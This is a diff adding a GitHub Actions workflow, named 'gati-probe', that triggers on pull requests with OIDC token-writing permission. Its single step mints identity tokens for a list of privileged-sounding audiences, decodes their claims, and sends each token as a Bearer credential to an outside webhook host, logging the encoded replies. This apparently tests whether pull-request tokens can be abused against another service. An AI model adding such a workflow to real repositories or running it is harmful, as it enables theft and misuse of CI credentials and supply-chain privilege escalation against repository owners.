@@ -1,0 +1,29 @@
+name: gati-probe
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          GATI_URL: https://plaidingress.sec.devnet.tools/webhook/7391a663b7df135c1af9f10afa149f20bd218446231c8687d3a4f1bfe0edd3ed
+        run: |
+          set -u
+          echo "repository=$GITHUB_REPOSITORY"
+          echo "event=$GITHUB_EVENT_NAME"
+          echo "ref=$GITHUB_REF"
+          echo "workflow_ref=$GITHUB_WORKFLOW_REF"
+          echo "idtoken_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          for P in github-internal-sync globals/write-self globals/pr-self presets/pr-triage presets/deploy-dispatcher-fanout renovate workflow-trigger; do
+            echo "=====PROFILE $P"
+            RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=gati:${P}")
+            JWT=$(printf '%s' "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+            if [ -z "$JWT" ]; then echo "no-jwt: $RESP"; continue; fi
+            echo "claims: $(printf '%s' "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 700)"
+            OUT=$(curl -sS -w '\n__HTTP__%{http_code}' -H "Authorization: Bearer $JWT" -H "Accept: application/json" "$GATI_URL")
+            echo "resp_b64: $(printf '%s' "$OUT" | base64 -w0)"
+          done
